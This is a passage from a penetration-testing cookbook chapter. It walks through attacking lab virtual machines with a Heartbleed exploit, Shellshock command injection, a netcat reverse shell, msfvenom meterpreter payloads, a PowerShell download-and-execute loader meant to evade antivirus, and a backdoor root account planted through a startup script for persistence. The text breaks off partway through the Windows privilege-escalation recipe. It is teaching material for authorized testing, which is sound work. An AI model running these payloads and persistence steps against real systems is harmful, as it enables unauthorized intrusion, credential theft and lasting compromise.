- en: Exploiting Platform Vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover:'
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting Heartbleed vulnerability using Exploit-DB
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Executing commands by exploiting Shellshock
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Creating and capturing a reverse shell with Metasploit
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Privilege escalation on Linux
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Privilege escalation on Windows
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Using Tomcat Manager to execute code
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Cracking password hashes with John the Ripper by using a dictionary
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Cracking password hashes via Brute Force with Hashcat
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Introduction
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: From time to time, we find a server with vulnerabilities in its operating system,
    in a library the web application uses, or in an active service, or there may be
    another security issue that is not exploitable from the browser or the web proxy.
  prefs: []
  type: TYPE_NORMAL
- en: If the project's scope allows us to do so and no disruption is caused to the
    server, we can try and exploit such vulnerabilities and get access to the underlying
    operating system of our target application.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will start from the point where we already found a vulnerability
    on the web server or operating system, then we will find an exploit for such a
    vulnerability and execute it against the target and, once the exploitation is
    successful, we will build our path up to gain administrative access, and to become
    capable of moving laterally around the network.
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting Heartbleed vulnerability using Exploit-DB
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Heartbleed is a vulnerability in the OpenSSL library discovered in 2014\. It
    allows the attacker to read portions of memory from the server; these portions
    may contain parts of the communication between clients and the server in clear
    text. As soon as the Heartbleed vulnerability was released, plenty of public exploits
    came to light. Offensive Security, the creators of Kali Linux, also host Exploit-DB
    ([https://www.exploit-db.com/](https://www.exploit-db.com/)[), a website that
    collects exploits made publicly available by their developers; we can find several
    variants of Heartbleed exploits there.](https://www.exploit-db.com/)
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will use the commands Kali includes to explore the local
    copy of Exploit-DB in Kali Linux, find the exploit we need, and finally we will
    use it to exploit Heartbleed in our target server.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: For this recipe, we will use the bee-box vulnerable virtual machine ([https://sourceforge.net/projects/bwapp/files/bee-box/](https://sourceforge.net/projects/bwapp/files/bee-box/))
    as it has an OpenSSL version vulnerable to a well-known vulnerability called Heartbleed
    ([http://heartbleed.com/](http://heartbleed.com/)), which affects encrypted communication
    over protocol TLS versions 1.0 and 1.1, and allows for an attacker to extract
    a portion of the server's memory containing unencrypted information.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The vulnerable bee-box virtual machine will have the IP address `192.168.56.12`
    and the vulnerable service is running on port `8443`. Let''s start by identifying
    the vulnerability in the server:'
  prefs: []
  type: TYPE_NORMAL
- en: 'We use `sslscan` to check the TCP port `8443` on bee-box; as the following
    screenshot shows, we will find it is vulnerable to Heartbleed:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/6409372e-353f-4c7b-bbe8-81df530fc864.png)'
  prefs: []
  type: TYPE_IMG
- en: By exploiting Heartbleed we will extract information from the server, before
    proceeding to undertake some activities in the applications, like logging into
    bWAPP (`https://192.168.56.12:8443/bwapp/`) to be sure there's some data in the
    server's memory.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now, to look for an exploit in the local copy of Exploit-DB, open a Terminal
    and type the `searchsploit heartbleed` command. The result is displayed here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/63487c84-c95c-4297-b905-90f5a48a489d.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We''ll pick the first exploit in the list. To inspect this exploit''s contents
    and analyze how to use it and what it does, we can simply use the `cat` command
    to display the Python code, as illustrated:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/f9dd5f69-6f59-4e7c-934d-5a1f04ed5bf8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'According to the instructions in the exploit, we should run it with the server
    address as the first parameter and then the `-p` option to indicate the port we
    want to test. So, the attacking command should be `python /usr/share/exploitdb/platforms/multiple/remote/32764.py
    192.168.56.12 -p 8443`. The next screenshot shows the result of a successful attack
    where we were able to retrieve a username and password:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/3742c583-96b5-4ad5-ad50-390b52ec6a31.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Heartbleed is a buffer over-read vulnerability in the OpenSSL TLS implementation;
    this means that more data can be read from memory than should be allowed. By exploiting
    this vulnerability, an attacker can read information from the OpenSSL server memory
    in clear text, which means that we don't need to decrypt or even intercept any
    communication between the client and the server. The exploitation works by abusing
    the heartbeat messages exchanged by server and client; these are short messages
    sent by the client and answered by the server to keep the session active. In a
    vulnerable implementation, a client can claim to send a message of size X, while
    sending a smaller amount (*Y*) of bytes. The server will then respond with *X*
    bytes, taking the difference (*X*-*Y*) from the memory spaces contiguous to those
    where the received heartbeat message is stored. This memory space usually contains
    requests (already decrypted) that were previously sent by other clients.
  prefs: []
  type: TYPE_NORMAL
- en: Once we identify a vulnerable target, we use the `searchsploit` command; it
    is the interface to the local copy of Exploit-DB installed on Kali Linux, and
    it looks for a string in the exploit's title and description and displays the
    results.
  prefs: []
  type: TYPE_NORMAL
- en: Once we understand how the exploit works and determine it is safe to use, we
    run it against the target and collect the results. In our example, we were able
    to extract a valid username and password from a client connected over an encrypted
    channel.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: It is very important to monitor the effect and impact of an exploit before we
    use it in a live system. Usually, exploits in Exploit-DB are trustworthy, even
    though they often need some adjustment to work in a specific situation, but there
    are some that may not do what they say; because of that, we need to check the
    source code and test it in our laboratory prior to using them in a real-life pen
    test.
  prefs: []
  type: TYPE_NORMAL
- en: See also
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Besides Exploit-DB, there are other sites where we can look for known vulnerabilities
    in our target systems and exploits:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://www.securityfocus.com](http://www.securityfocus.com)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.xssed.com/](http://www.xssed.com/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[https://packetstormsecurity.com/](https://packetstormsecurity.com/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://seclists.org/fulldisclosure/](http://seclists.org/fulldisclosure/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://0day.today/](http://0day.today/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Executing commands by exploiting Shellshock
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Shellshock (also called Bashdoor) is a bug that was discovered in the bash shell
    in September 2014, allowing the execution of commands through functions stored
    in the values of environment variables.
  prefs: []
  type: TYPE_NORMAL
- en: Shellshock is relevant to us as web penetration testers because developers sometimes
    use calls to system commands in PHP and CGI scripts—more commonly in CGI—if these
    scripts make use of system environment variables.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will exploit a Shellshock vulnerability in the bee-box vulnerable
    virtual machine to gain command execution on the server.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Browse to bee-box over HTTP (`http://192.168.56.12/bWAPP/`) and log in to start
    this exercise:'
  prefs: []
  type: TYPE_NORMAL
- en: 'In the Choose your bug: drop-down box, select Shellshock Vulnerability (CGI)
    and then click on Hack:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/08dd482f-4901-433a-ab9a-62333dbcb8f9.png)'
  prefs: []
  type: TYPE_IMG
- en: 'In the text, we can see something interesting: Current user: www-data. This
    may mean that the page is using system calls to get the username. It also gives
    us a hint to attack the referrer.'
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s see what is happening behind the scenes and use Burp Suite to record
    the requests and reload the page. If we look at the proxy''s history:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/143f9b2f-ae48-4a59-bada-9fdefd731f98.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We can see that there is an `iframe` calling a shell script: `/cgi-bin/shellshock.sh`,
    which might be the script vulnerable to Shellshock.'
  prefs: []
  type: TYPE_NORMAL
- en: Let's take the hint and try to attack the referrer of `shellshock.sh`. We first
    need to configure Burp Suite to intercept server responses. Go to Options in the
    Proxy tab and check the box with the text Intercept responses based on the following
    rules.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now, set Burp Suite to intercept and then reload `shellshock.php`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'In Burp Suite, click Forward until you get to the `GET` request to `/bWAPP/cgi-bin/shellshock.sh`.
    Then, replace the `Referer` with `() { :;}; echo "Vulnerable:"` as shown in the
    following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/91b11f28-2008-4b64-a7f5-f54f29899b44.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Click Forward again, and once more in the request to the `.ttf` file, and then
    we should get the response from `shellshock.sh`, as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9711560e-64a3-4b9b-a997-f6af7acda1dd.png)'
  prefs: []
  type: TYPE_IMG
- en: The response now has a new header parameter called `Vulnerable`. This is because
    it integrated the output of the echo command to the HTML header we submitted,
    now we can take this further and execute more interesting commands.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, try the `() { :;}; echo "Vulnerable:" $(/bin/sh -c "/sbin/ifconfig")`
    command. As the result shows, the command''s result is included in the response
    header:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/d705a9ed-a11a-460a-94a1-b6ff5044edb7.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Being able to execute commands remotely on a server is a huge advantage in
    a penetration test and the next natural step is to obtain a remote shell, meaning
    a direct connection where we can send more elaborate commands. Open a Terminal
    in Kali Linux and set up a listening network port with the following command:
    `nc -vlp 12345`.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now go to Burp Suite proxy's history, select any request to `shellshock.sh`,
    right-click on it, and send it to the repeater.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Once in the repeater, change the value of `Referer` to: `() { :;}; echo "Vulnerable:"
    $(/bin/sh -c "nc -e /bin/bash 192.168.56.10 12345")`. In this case, `192.168.56.10`
    is the address of our Kali machine.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Click Go. If we check our Terminal, we can see the connection is established;
    issue a few commands to check whether or not we have a remote shell:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/3e76e705-154e-4b70-94e2-d3e88ef8246e.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the first five steps, we discovered that there was a call to a shell script
    and, as it should have been run by a shell interpreter, it may have been bash
    or a vulnerable version of bash.
  prefs: []
  type: TYPE_NORMAL
- en: 'To verify that, we performed the following test:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: The first part, `() { :;};`, is an empty function definition since bash can
    store functions as environment variables, and this is the core of the vulnerability,
    as the parser keeps interpreting (and executing) the commands after the function
    ends. This allows us to issue the second part, `echo "Vulnerable:"`, a command
    that simply returns and echoes what it is given as input.
  prefs: []
  type: TYPE_NORMAL
- en: The vulnerability occurs in the web server because the CGI implementation maps
    all the parts of a request to environment variables, so this attack also works
    if done over User-Agent or Accept-Language instead of referer. Once we know the
    server is vulnerable, we issue a test command, `ifconfig`, and set up a reverse
    shell.
  prefs: []
  type: TYPE_NORMAL
- en: A reverse shell is a remote shell that has the particular characteristic of
    being initiated by the server so that the client listens for a connection instead
    of the server waiting for a client to connect, as in a bind connection.
  prefs: []
  type: TYPE_NORMAL
- en: Once we have a shell to the server, we need to escalate privileges and get the
    information needed to help with our penetration test.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Shellshock affects a huge number of servers and devices all around the world,
    and there is a variety of ways to exploit it. For example, the Metasploit Framework
    includes a module to set up a DHCP server to inject commands on the clients that
    connect to it; this is very useful in a network penetration test in which we have
    mobile devices connected to the LAN ([https://www.rapid7.com/db/modules/auxiliary/server/dhclient_bash_env](https://www.rapid7.com/db/modules/auxiliary/server/dhclient_bash_env)).
  prefs: []
  type: TYPE_NORMAL
- en: Creating and capturing a reverse shell with Metasploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: When we gain command execution on a server, we usually get it through a limited
    web-shell. The next thing we need to do is to find a way to upgrade this limited
    shell into a fully interactive shell and eventually escalate it to root/administrator
    level privileges.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will learn how to use Metasploit's `msfvenom` to create an
    executable program that triggers a connection back to our attacking machine and
    spawns an advanced shell (meterpreter) so we can further exploit the server.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For this exercise, have both the Kali and bee-box virtual machines running,
    then follow the next steps:'
  prefs: []
  type: TYPE_NORMAL
- en: 'First, we use `msfvenom` to generate our reverse meterpreter shell, setting
    it up to connect back to the Kali machine''s IP address. Open a Terminal in Kali
    and issue the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: '![](assets/9a25e509-0f89-4175-abed-618b4b9e441d.png)'
  prefs: []
  type: TYPE_IMG
- en: This will create a file named `cute_dolphin.bin`, which is a reverse Linux meterpreter
    shell; reverse means that it will connect back to the attacking machine instead
    of listening for us to connect.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we need to set up a listener for the connection our cute dolphin is going
    to create. Open a `msfconsole` terminal and once it loads, issue the following
    commands:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'As you can see, the payload, `lhost`, and `lport` are the ones we used to create
    the `.bin` file. This is the IP address and TCP port the program is going to connect
    to, so we will need to listen on that network interface of our Kali Linux and
    over that port. The final exploit configuration should look as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/b8db6eac-beb7-4dc2-b40d-4fa4556361be.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now we have our Kali ready, it''s time to prepare the attack on the victim.
    Let''s start the Apache service as the root and run the following code:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'Then, copy the malicious file to the web server folder:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'Now we proceed to the exploitation. We know bee-box is vulnerable to Shellshock
    and will use it to make the server download the malicious file. Exploit Shellshock
    on the server with the following payload:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'The last two parts of the payload are for setting the execution permission
    to the downloaded file (`chmod +x /tmp/cute_dolphin.bin`) and to make sure the
    file was downloaded (`ls -l /tmp/cute_dolphin.bin`). As the following screenshot
    shows, a successful exploitation will return the filename and its properties:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/5b54ca2c-b228-4ada-9ccf-0c922020a878.png)'
  prefs: []
  type: TYPE_IMG
- en: 'With the file in the server, we exploit Shellshock again to execute it: `()
    { :;}; echo "Vulnerable:" $(/tmp/cute_dolphin.bin")`.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'If everything goes right, we should see a connection being received in our
    Metasploit''s listener, as illustrated as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/12914c45-d1cc-4f15-8e7f-be0b06c2eebb.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Once the session is established, we can use the `help` command to see the functionality
    of meterpreter and start to run commands on the compromised server:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9d5c4b08-eb31-454f-99d2-401b10dbd301.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '`msfvenom` helps us create payloads from the extensive list of Metasploit''s
    payloads, and incorporates them into source code in many languages, or creates
    scripts and executable files, as we did in this recipe. The parameters we used
    here were the payload to use (`linux/x86/meterpreter/reverse_tcp`), the host and
    port to connect back `(lhost` and `lport`), and the output format `(-f elf`),
    redirecting the standard output to a file to have it saved as `cute_dolphin.bin`.'
  prefs: []
  type: TYPE_NORMAL
- en: The `exploit/multi/handler` module of Metasploit is a payload handler. This
    means it doesn't actually perform any exploitation; instead it only processes
    connections with payloads executed in compromised hosts. In this case, we used
    it to listen for the connection and after the connection was established, it ran
    the meterpreter payload.
  prefs: []
  type: TYPE_NORMAL
- en: Meterpreter is Metasploit's version of a shell on steroids. Although meterpreter
    for Linux is more limited than its Windows counterpart, which contains modules
    to sniff on a victim's network and to perform privilege escalation and password
    extraction, we can still use it as a pivot point to access the victim's local
    network, or to exploit the host further by using the local and post-exploitation
    Metasploit modules.
  prefs: []
  type: TYPE_NORMAL
- en: Privilege escalation on Linux
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: For some penetration testing projects, getting a web-shell may be enough in
    terms of exploitation and demonstration of the impact of a vulnerability. In some
    other cases, we may need to go beyond that to expand our level of privilege within
    that server or to use it to pivot to other hosts in the network.
  prefs: []
  type: TYPE_NORMAL
- en: In this first recipe about privilege escalation, we will draw on the previous
    recipe where we uploaded and executed a reverse shell to our attacking machine
    and use tools included in Kali Linux to gain administrative access on the server.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: It is recommended that the previous two recipes, *Executing commands by exploiting
    Shellshock* and *Creating and capturing a reverse shell with Metasploit*, be completed
    before starting this one, although it is possible to achieve the same results
    from any limited shell on a remote server.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We have a meterpreter shell running on a compromised server—more specifically,
    bee-box with the IP `192.168.56.12`. Let''s start by finding a way to escalate
    privileges:'
  prefs: []
  type: TYPE_NORMAL
- en: Kali Linux includes a tool called `unix-privesc-check`; it checks the system
    for configuration vulnerabilities that may allow us to escalate privileges. From
    a meterpreter shell, we can use the upload command to upload it to the server.
    In your meterpreter session, issue the `upload /usr/bin/unix-privesc-check /tmp/` command.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Once the file is uploaded, open a system shell (using the `shell` command in
    meterpreter) and run the script with `/tmp/unix-privesc-check standard`. The following
    screenshot shows the process:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/2c4da87f-b3a8-4e7b-b00c-b8eb2f5ae8c7.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The script will show a long list of results, but we are interested in the one
    that shows `WARNING` at the beginning. In the following screenshot, we can see
    that there is a script (`/etc/init.d/bwapp_movie_search`) which is run by root
    at startup and everyone can write to it (`World write is set`):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/5b4b8a21-716e-4044-8409-7a52235a93e7.png)'
  prefs: []
  type: TYPE_IMG
- en: We will use that file to make the root user execute commands at startup. We
    will make it create a user with administrative privileges so we can connect through
    SSH to the the server at any time. To do so, we need to check the groups existing
    in the system so we can have an idea of which have privileged access. In the system
    shell, run the `cat /etc/group|sort -u` command. You will see that there are some
    interesting names such as `adm`, `admin`, and `root`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'As we don''t have a full shell, we cannot open a text editor to add our commands
    to the target file, so we will need to append them line by line to the file using
    `echo`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'To verify that the commands were introduced properly, use `tail`. It will show
    the last lines of the file: `tail /etc/init.d/bwapp_movie_search`. In the screenshot,
    we can see what it should look like:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/08a13fda-a7cf-4fb5-8b4d-9cb8bb4c7e2e.png)'
  prefs: []
  type: TYPE_IMG
- en: As this server is part of our testing lab, we can just restart it. In a real-world
    scenario, an attacker could attempt an attack to cause the server to restart,
    or a DoS to force the administrators to reboot it.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Once the server is restarted, use ssh in your Kali Linux to log in to `ssh hacker@192.168.56.12`
    and then the password you set in *step 5*. If asked about accepting the certificate
    of the host, type `yes` and press *Enter*.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'If everything went correctly, you will be able to log in. The following screenshot
    shows that the user has root access to all commands because they belong to group
    admin (`sudo -l`) and can impersonate the root user (`sudo su`):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/4a50a68d-8406-44c0-a35d-53640f28a505.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we used an existing meterpreter shell to upload a script to
    the compromised server. `unix-privesc-check` is a shell script that automatically
    looks for certain configurations, characteristics, and parameters in the system
    that may allow a limited user to access resources which they are not authorized
    for, such as files belonging to other users or programs that are run under higher
    privilege profiles. We ran `unix-privesc-check` with the standard parameter, which
    makes only a basic set of tests; there is also the detailed option that takes
    longer but also performs a deeper analysis and can give us more escalation alternatives.
  prefs: []
  type: TYPE_NORMAL
- en: After analyzing the results of `unix-privesc-check`, we decided to modify a
    script that is run with high privileges at boot time and added two commands to
    it. The first one was to create a user belonging to the groups `admin`, `adm`,
    and `root`, and the other was to set a password for such a user. To add those
    commands to the file, we used the `echo` command and the output redirection operator
    (`>`), as our limited shell won't allow us to open a text editor and directly
    edit the file. Then we restarted the virtual machine.
  prefs: []
  type: TYPE_NORMAL
- en: Before making any changes to a target system, always make sure that those changes
    are not going to disrupt any service and back up the files before altering anything.
  prefs: []
  type: TYPE_NORMAL
- en: When the machine rebooted, we connected to it via SSH using the user we set
    up to create and verify that it actually had root privileges. It is also a good
    idea to remove the lines we added to the `/etc/init.d/bwapp_movie_search` script
    to avoid triggering further alerts.
  prefs: []
  type: TYPE_NORMAL
- en: See also
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We decided to use the modification of a file that is executed with root privileges
    at startup as our way of gaining administrative access. There are other options
    that may not require the attacker to wait for the server to be restarted, although
    altering startup scripts may be a way to retain persistent access, especially
    if such alterations are done in obscure functions within the scripts that are
    rarely looked into by administrators and developers.
  prefs: []
  type: TYPE_NORMAL
- en: 'Other common aspects to look for when trying to escalate privileges in Unix-based
    systems are the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '**SUID bit**: When this bit is set in the properties of a program or script,
    such a program will be executed under the privileges of the owner user, not under
    those of the user executing it. For example, if an executable file belongs to
    the root user (the owner is the first name shown when we do `ls -l` over a file)
    and is executed by user `www-data`, the system will treat that program as being
    executed by root. So, if we find a file like that and manage to alter the files
    that it opens or uses, we may be able to gain root execution.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**PATH and other environment variables**: When programs call other programs
    or read system files, they need to specify their names and locations within the
    system; sometimes these programs only specify the name and relative paths. Also,
    the operating system has some precedence criteria regarding where to look first
    when an absolute path is not specified—for example, to look first in the current
    folder, in the program''s location, or in those specified in the PATH environment
    variable. These two conditions open the door for an attacker to add a malicious
    file with the same name as the one required by a privileged program, in a location
    that will be looked at by the operating system before the actual location of the
    file, forcing the vulnerable program to process the contents of the attacker''s
    file instead of the legitimate one.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Exploits for known vulnerabilities**: In real-world organizations, Unix-based
    systems are often the least frequently patched and updated. This gives attackers
    and penetration testers the opportunity to look for publicly available exploits
    that will allow them to take advantage of vulnerabilities existing in out-of-date
    software.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Privilege escalation on Windows
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this author's experience, Windows-based web servers have a considerable market
    share in business environments, and for internal web applications they may be
    more than 60% in a typical organization, adding to this the clear dominance of
    Microsoft SQL Server in the database market. This means that as penetration testers,
    we will surely face the situation where we manage to get command execution on
    a Windows server and need to gain administrative access in order to further exploit
    the network.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will start from a limited web-shell on a Windows server and
    use publicly available exploits to gain system access, the highest local privilege
    level in Windows.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we will assume we already have a limited shell ([https://github.com/tennc/web-shell/blob/master/fuzzdb-web-shell/asp/cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx))
    on a Windows 2008 R2 server. We will be using a Windows virtual machine, as downloaded
    from Microsoft's download center at [https://www.microsoft.com/en-us/download/details.aspx?id=2227](https://www.microsoft.com/en-us/download/details.aspx?id=2227).
    The only change made is the addition of the Web Server Administrator role and
    configuring it to support ASP.Net applications. To enable ASP.Net, after installing
    the Web Server Administrator role, run `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis
    –i` from a command Terminal.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'So, we managed to upload our web-shell to a Windows web server. It is located
    at `http://192.168.56.14/cmd.aspx`. The first thing to do is to figure out which
    privilege level the web server is running:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Browse to the web-shell (`http://192.168.56.14/cmd.aspx`) and run the `whoami`
    command, as shown:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/82dfbcd2-de2e-4dcd-b747-8531bfba01e6.png)'
  prefs: []
  type: TYPE_IMG
- en: As you can see, our user is `defaultapppool`, from the `iis apppool` group,
    which is a very limited one in its default configuration.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we need to improve our method of issuing commands. Let''s use `msfvenom`
    to create a reverse meterpreter shell. We will use the server''s own PowerShell
    to execute our payload in memory, without it ever touching the target''s disk,
    making it difficult for antivirus and other protection software to detect it.
    To do that, our payload should be in PowerShell script format (`-f psh`) and we
    will save it directly to Kali''s web root folder (`-o /var/www/html/cutedolphin.ps1`),
    shown as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/84ee4751-c37c-4784-b88d-c95982bef5f4.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Once the payload is created, be sure that Kali''s web server is running so
    the target can download the script: `service apache2 start`.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now create a `handler` for the meterpreter connection. Open `msfconsole` in
    a Terminal and execute the following to adjust the parameters as per the payload:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'The handler configuration should look like the following screenshot. Check
    everything is correct and execute the handler (`run`); it will open the configured
    port and wait for a connection:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/cf6970c9-3909-40d4-90c7-4dd3e182ad37.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Once we have the handler running, we need to execute the payload in the server.
    To do so, go to the web-shell and set the Program to `powershell.exe` and the
    Arguments to `-noexit -c iex ((New-Object Net.WebClient).DownloadString(''http://192.168.56.10/cutedolphin.ps1''))`
    and click Run:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/e124d692-dcf9-4aa7-9bc0-302a0d254eef.png)'
  prefs: []
  type: TYPE_IMG
- en: 'If the payload is correctly executed and the connection received, we will see
    our handler start a meterpreter session. Take note of the number assigned to the
    session, `1` in this case:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/1dbc4cc1-f960-4a50-b51c-c300a0b1382d.png)'
  prefs: []
  type: TYPE_IMG
- en: 'When running meterpreter on Windows hosts, we can use the `getsystem` command
    to easily escalate to System if the configuration allows it. As the following
    screenshot shows, it is not possible in this case; we also tried to dump the local
    password hashes but it didn''t work. So we get the system information to look
    for a way to escalate privileges:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/faf8b7ae-0da5-4679-9cd8-6068e89353d5.png)'
  prefs: []
  type: TYPE_IMG
- en: Use the `background` command to return to the Metasploit console and keep the
    meterpreter session running in the background.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'We use the `searchsploit` command, and it shows very few exploits matching
    `2008 R2`. Only one of them is local, meaning it can be executed from an existing
    session, and if we try it, it won''t work because our target is already patched:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/11826a66-d030-4e31-9ff9-26d84b2592a1.png)'
  prefs: []
  type: TYPE_IMG
- en: 'But we know it is very unlikely that there are only six exploits for Windows
    2008 R2 in Exploit-DB. As demonstrated in the screenshot, if we use grep (`grep
